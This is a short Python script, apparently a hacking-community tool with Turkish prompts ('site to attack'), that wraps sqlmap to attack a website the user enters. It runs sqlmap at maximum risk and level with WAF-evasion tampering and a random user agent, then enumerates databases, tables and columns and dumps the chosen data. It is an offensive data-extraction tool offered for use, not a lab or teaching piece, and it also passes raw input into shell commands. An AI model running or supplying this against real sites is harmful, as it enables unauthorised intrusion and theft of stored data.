import time
import os

print("[+] Root sql scanner")
print("[+] Code by n0ir & RootMrSpy")


print("")
site = input("[+] Saldırı yapılacak site: ")
print("")

os.system("sqlmap.py -u " + site + " --risk=3 --level=5 --tamper=between --random-agent --no-cast --batch --threads=10 --dbs")

print("")
database = input("[+] Database ismi giriniz: ")
print("")

os.system("sqlmap.py -u " + site + " --risk=3 --level=5 --tamper=between --random-agent --no-cast --batch --threads=10 -D " + database + " --tables")

print("")
tables = input("[+] Tablo ismi giriniz: ")
print("")

os.system("sqlmap.py -u " + site + " --risk=3 --level=5 --tamper=between --random-agent --no-cast --batch --threads=10 -D " + database + " -T" + tables + " --column")

print("")
kolon = input("[+] Kolon ismi giriniz: ")
print("")

os.system("sqlmap.py -u " + site + " --risk=3 --level=5 --tamper=between --random-agent --no-cast --batch --threads=10 -D " + database + " -T" + tables + " -C" + kolon + " --dump")